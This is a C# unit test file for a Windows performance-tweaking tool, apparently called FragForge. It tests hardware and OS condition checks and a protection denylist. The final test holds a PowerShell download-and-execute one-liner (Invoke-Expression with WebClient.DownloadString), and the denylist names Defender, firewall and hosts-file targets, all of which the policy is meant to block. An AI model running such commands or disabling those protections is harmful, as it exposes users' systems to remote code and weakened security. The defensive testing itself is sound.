using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Core;

public sealed class ConditionAndPolicyTests
{
    private static ConditionResult Evaluate(string type, object? parameters = null, HardwareProfile? profile = null) => new ConditionFactory().Create(Spec.Condition(type, parameters)).Evaluate(profile ?? TestProfiles.Pn64());

    [Fact]
    public void Windows_AcceptsSupportedBuildRange_AndRejectsWindows10() => Assert.False(Evaluate("windows", new { minBuild = 26100, maxBuild = 26299 }, TestProfiles.Windows10()).IsMet);

    [Fact]
    public void Windows_IsUnknownOnUnsupportedPlatform()
    {
        var result = Evaluate("windows", null, TestProfiles.NonWindows());
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
    }

    [Fact]
    public void HybridCpu_MetFor1220P_ButUnknownDoesNotBecomeFalse()
    {
        Assert.True(Evaluate("hybridCpu", new { expected = true }).IsMet);
        var unknown = TestProfiles.Pn64() with { Cpu = TestProfiles.Pn64().Cpu with { IsHybrid = null } };
        var result = Evaluate("hybridCpu", new { expected = true }, unknown);
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
    }

    [Fact]
    public void GpuVendor_IntelIgpuMet_AndNvidiaTweakNotApplicable()
    {
        Assert.True(Evaluate("gpuVendor", new { vendor = "Intel" }).IsMet);
        Assert.False(Evaluate("gpuVendor", new { vendor = "Nvidia" }).IsMet);
        Assert.True(Evaluate("gpuVendor", new { vendor = "Nvidia" }, TestProfiles.GpuOnlyDiscrete()).IsMet);
    }

    [Fact]
    public void AdapterCondition_FindsI225V_AndIgnoresWifiWhenEthernetRequired()
    {
        Assert.True(Evaluate("adapter", new { descriptionContains = "I225-V", kind = "Ethernet", physicalOnly = true }).IsMet);
        Assert.False(Evaluate("adapter", new { descriptionContains = "I225-V", kind = "WiFi" }).IsMet);
    }

    [Fact]
    public void Cs2Condition_IsUnmetWhenNotInstalled() => Assert.False(Evaluate("cs2", new { installed = true }, TestProfiles.NoCs2()).IsMet);

    [Fact]
    public void MemoryChannels_DualOnPn64_SingleWhenProfileSaysSo()
    {
        Assert.True(Evaluate("memoryChannels", new { state = "Dual" }).IsMet);
        Assert.False(Evaluate("memoryChannels", new { state = "Dual" }, TestProfiles.SingleChannel()).IsMet);
        var unknown = TestProfiles.Pn64() with { Memory = TestProfiles.Pn64().Memory with { Channels = MemoryChannelState.Unknown } };
        Assert.False(Evaluate("memoryChannels", new { state = "Dual" }, unknown).IsKnown);
    }

    [Fact]
    public void SecurityCondition_UnknownIsNotTreatedAsDisabled()
    {
        var profile = TestProfiles.Pn64() with { Security = TestProfiles.Pn64().Security with { Vbs = FeatureState.Unknown } };
        var result = Evaluate("security", new { feature = "vbs", state = "Disabled" }, profile);
        Assert.False(result.IsKnown);
        Assert.False(result.IsMet);
        Assert.True(Evaluate("security", new { feature = "vbs", state = "Disabled" }).IsMet);
    }

    [Fact]
    public void UnknownConditionType_IsRejected()
    {
        var ex = Assert.Throws<CatalogValidationException>(() => new ConditionFactory().Create(Spec.Condition("telepathy")));
        Assert.Contains("telepathy", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Composite_Conditions_ShortCircuitDeterministically()
    {
        var result = Evaluate("all", new { conditions = new object[] { new { type = "windows" }, new { type = "cpuVendor", parameters = new { vendor = "Intel" } } } });
        Assert.True(result.IsMet);
        Assert.False(Evaluate("not", new { condition = new { type = "cpuVendor", parameters = new { vendor = "Intel" } } }).IsMet);
    }

    [Fact]
    public void Denylist_BlocksServicesTasksAndBcd()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("WinDefend"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("mpssvc"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("ipfsvc"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("jhi_service"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureTaskAllowed(@"\Microsoft\Windows\WindowsUpdate\Scheduled Start"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureBcdAllowed("hypervisorlaunchtype"));
        policy.EnsureBcdAllowed("disabledynamictick");
        policy.EnsureServiceAllowed("DiagTrack");
        policy.EnsureServiceAllowed("SysMain");
    }

    [Fact]
    public void Denylist_BlocksNetworkWakePropertiesAndFileTargets()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureNetworkPropertyAllowed("Ethernet", "**EEE"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureNetworkPropertyAllowed("Ethernet", "*RSS"));
        policy.EnsureNetworkPropertyAllowed("Ethernet", "*EEE");
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureFileAllowed(@"C:\Windows\System32\drivers\etc\hosts"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsurePowerShellAllowed("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')"));
    }
}
